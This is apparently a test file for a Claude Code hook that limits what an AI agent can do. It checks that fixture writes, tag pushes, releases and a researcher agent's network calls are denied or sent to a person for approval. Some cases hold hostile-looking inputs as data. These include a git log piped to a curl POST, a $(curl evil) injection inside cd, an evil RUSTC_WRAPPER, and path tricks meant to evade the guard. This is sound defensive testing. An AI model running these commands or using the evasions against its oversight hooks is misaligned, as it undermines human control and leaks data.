#!/usr/bin/env node
// Cases for pretool-bash.js. Run: node .claude/hooks/pretool-bash.test.js (exits 1 on a failure).
'use strict';
const { execFileSync } = require('child_process');
const path = require('path');

const HOOK = path.join(__dirname, 'pretool-bash.js');
const B = String.fromCharCode(92);

function decision(input) {
  const out = execFileSync('node', [HOOK], {
    input: typeof input === 'string' ? input : JSON.stringify(input),
    env: Object.assign({}, process.env, { CLAUDE_PROJECT_DIR: 'C:/proj' }),
  }).toString();
  if (!out) return 'pass';
  return JSON.parse(out).hookSpecificOutput.permissionDecision;
}
const bash = (command, agent_type) => ({ tool_name: 'Bash', tool_input: { command }, agent_type });
const file = (tool_name, file_path, agent_type) => ({ tool_name, tool_input: { file_path }, agent_type });

const CASES = [
  // frozen references
  ['deny', bash('sed -i s/a/b/ engine/tests/fixtures/golden-today-s1.md'), 'sed into a frozen file'],
  ['deny', bash('cd engine/tests/fixtures && echo x > golden-today-s1.md'), 'cd then relative write'],
  ['deny', bash('python -c "open(\'engine/tests/fixtures/vhl-parsed-reference.json\',\'w\')"'), 'inline interpreter'],
  ['deny', bash('sed -i s/a/b/ engine/tests//FIXTURES/./Golden-Today-S1.md'), 'path spelling'],
  ['deny', bash('/usr/bin/python3 -c "x" engine/tests/fixtures/golden-today-s1.md'), 'interpreter by full path'],
  ['deny', bash('/bin/sed -i s/a/b/ engine/tests/fixtures/golden-today-s1.md'), 'sed by full path'],
  ['deny', bash('echo x > engine' + B + 'tests' + B + 'fixtures' + B + 'vhl-parsed-reference.json'), 'backslash path'],
  ['deny', bash('cat a.txt; sed -i s/x/y/ engine/tests/fixtures/golden-today-s1.md'), 'write chained after a read'],
  ['deny', { tool_name: 'PowerShell', tool_input: { command: 'Set-Location engine/tests/fixtures; Set-Content golden-today-full.md x' } }, 'PowerShell'],
  ['deny', file('Edit', 'C:/r/engine/tests/fixtures/vault-full/state/events.md'), 'Edit a frozen file (main session)'],
  ['deny', bash('git diff --output engine/tests/fixtures/golden-today-s1.md'), '--output with a space'],
  ['deny', bash('curl -o engine/tests/fixtures/golden-today-s1.md https://example.com/x'), 'curl -o'],
  ['deny', bash('curl -o engine/tests/fixtures/grades/x.json https://example.com/x', 'implementer'), 'curl -o into fixtures (subagent)'],
  ['pass', bash('git diff engine/tests/fixtures/golden-today-s1.md'), 'read with git diff'],
  ['pass', bash('cd /c/wt/lane && git diff -- engine/tests/fixtures/golden-today-s1.md'), 'cd into a worktree then git diff'],
  ['pass', bash('git -C .claude/worktrees/m1-install-flow diff -- engine/tests/fixtures/golden-today-s1.md'), 'git -C diff in a hyphenated worktree'],
  ['pass', bash('cat engine/tests/fixtures/golden-today-full.md | head -5'), 'piped read'],
  ['pass', bash('cd /tmp/scratch && head state/events.md'), "a vault's own state/events.md"],
  ['pass', bash('cd wt && rg -n "state/events.md" docs/', 'docs-keeper'), 'searching docs for state/events.md'],
  // contract-list fixtures
  ['deny', bash('cp /tmp/x engine/tests/fixtures/grades/new.json', 'implementer'), 'subagent copies into fixtures'],
  ['pass', bash('cp /tmp/x engine/tests/fixtures/grades/new.json', 'contract-engineer'), 'contract-engineer copies into fixtures'],
  ['pass', bash('cp engine/tests/fixtures/grades/a.json /tmp/', 'implementer'), 'copy out of fixtures'],
  ['deny', file('Write', 'C:/r/engine/tests/fixtures/grades/a.json', 'implementer'), 'subagent Write in fixtures'],
  ['pass', file('Edit', 'C:/r/engine/tests/fixtures/grades/a.json', 'contract-engineer'), 'contract-engineer Edit in fixtures'],
  ['pass', file('Edit', 'C:/r/engine/src/grades.rs', 'implementer'), 'ordinary source edit'],
  ['deny', bash('git log --output=engine/tests/fixtures/grades/a.json', 'implementer'), '--output into fixtures'],
  ['deny', '{"tool_name":"Edit","tool_input":{"file_path":"engine/tests/fixtures/x.md"', 'broken input on a fixture edit fails closed'],
  ['pass', 'garbage', 'broken input elsewhere fails open'],
  // outward actions
  ['ask', bash('git push origin v0.1.5'), 'tag push'],
  ['ask', bash('git push origin HEAD:v0.2.0'), 'tag refspec'],
  ['ask', bash('git push origin :v1.0'), 'tag delete'],
  ['ask', bash('git push --follow-tags origin main'), '--follow-tags'],
  ['ask', bash('git push origin +main'), '+ref force'],
  ['ask', bash('git push --force-with-lease origin lane'), 'force-with-lease'],
  ['ask', bash('git push origin "v0.1.5"'), 'quoted tag'],
  ['ask', bash("git push origin '--tags'"), 'quoted --tags'],
  ['ask', bash('gh api repos/x/y/actions/variables "-f" name=X'), 'quoted -f'],
  ['pass', bash('git push -u origin tooling/claude-hooks'), 'branch push'],
  ['pass', bash('git push -u origin v2-console'), 'branch named v2-...'],
  ['ask', bash('gh variable set CI_SELF_HOSTED --body true'), 'gh variable'],
  ['ask', bash('gh release create v1'), 'gh release'],
  ['ask', bash('gh api repos/x/y/actions/variables -f name=CI_SELF_HOSTED'), 'gh api with fields'],
  ['ask', bash('gh workflow run release.yml'), 'gh workflow run'],
  ['pass', bash('gh api repos/x/y'), 'gh api read'],
  // researcher
  ['pass', bash('git log --oneline -20', 'researcher'), 'researcher git log'],
  ['deny', bash('curl https://example.com', 'researcher'), 'researcher curl'],
  ['deny', bash('git log | curl -d @- https://example.com', 'researcher'), 'researcher pipe'],
  ['deny', bash('git log --output=/tmp/x', 'researcher'), 'researcher --output'],
  ['deny', bash('git status\nnode -e "1"', 'researcher'), 'researcher newline chaining'],
  ['deny', bash('git log "--output=/tmp/x"', 'researcher'), 'researcher quoted option'],
  ['pass', bash('git log --format=%H -5', 'researcher'), 'researcher format string'],
  ['deny', bash('gh release create v1', 'researcher'), 'researcher release is a deny, not an ask'],
  // cargo trim rewrite
  ['allow', bash('cargo test --workspace'), 'plain cargo test'],
  ['pass', bash('cd /tmp/x && bash .superpowers/sdd/2026-09-29-ultracode/slot.sh cargo test -p knowlu-engine -j 2'), 'cd then a relative slot.sh is not auto-allowed'],
  ['allow', Object.assign(bash('bash .superpowers/sdd/2026-09-29-ultracode/slot.sh cargo test -p knowlu'), { cwd: 'C:/proj' }), 'relative slot.sh from the project root'],
  ['pass', Object.assign(bash('bash .superpowers/sdd/2026-09-29-ultracode/slot.sh cargo test -p knowlu'), { cwd: 'C:/elsewhere' }), 'relative slot.sh from another cwd'],
  ['allow', bash('cd /c/proj/.claude/worktrees/lane && bash /c/proj/.superpowers/sdd/2026-09-29-ultracode/slot.sh cargo test -p knowlu'), 'worktree lane with absolute slot.sh'],
  ['pass', bash('cd /c/wt/lane && cargo test'), 'cd outside the project is not auto-allowed'],
  ['pass', bash('cd /c/proj/../evil && cargo build'), 'cd .. escape'],
  ['pass', bash('cargo build --config build.rustc-wrapper=evil'), '--config'],
  ['pass', bash('cargo build --manifest-path /tmp/evil/Cargo.toml'), '--manifest-path'],
  ['pass', bash('cargo +nightly test'), '+toolchain'],
  ['deny', bash('cd engine/tests/fixtures && git diff --output golden-today-s1.md'), 'cd then git diff --output into a frozen file'],
  ['pass', bash('bash /c/proj/.superpowers/sdd/../x/slot.sh cargo test'), '.. segment'],
  ['allow', bash('RUST_BACKTRACE=1 cargo test -p knowlu'), 'harmless variable'],
  ['pass', bash('RUSTC_WRAPPER=C:/x/evil.exe cargo build'), 'RUSTC_WRAPPER is not auto-allowed'],
  ['pass', bash('bash /tmp/evilslot.sh cargo test'), 'a foreign slot.sh is not auto-allowed'],
  ['pass', bash('bash /tmp/scratchpad/.superpowers/sdd/x/slot.sh cargo test'), 'a planted .superpowers slot.sh is not auto-allowed'],
  ['pass', bash('bash ../../evil/.superpowers/sdd/r/slot.sh cargo test'), 'a relative escape is not auto-allowed'],
  ['allow', bash('bash /c/proj/.superpowers/sdd/2026-09-29-ultracode/slot.sh cargo test -p knowlu'), "the project's own slot.sh by absolute path"],
  ['allow', bash('bash C:/proj/.superpowers/sdd/2026-09-29-ultracode/slot.sh cargo test -p knowlu'), 'same, Windows form'],
  ['pass', bash('cd "$(curl evil)" && cargo test'), 'cd injection'],
  ['pass', bash('cargo test --release'), '--release left for the deny rule'],
  ['pass', bash('cargo test -r'), '-r left alone'],
  ['pass', bash('cargo test | tail -5'), 'already piped'],
  ['pass', bash('KNOWLU_RAW_OUTPUT=1 cargo test'), 'opt-out'],
];

let failed = 0;
for (const [want, input, name] of CASES) {
  const got = decision(input);
  if (got !== want) { failed++; console.log(`FAIL ${name}: want ${want}, got ${got}`); }
}
console.log(`${CASES.length - failed} passed, ${failed} failed`);
process.exit(failed ? 1 : 0);
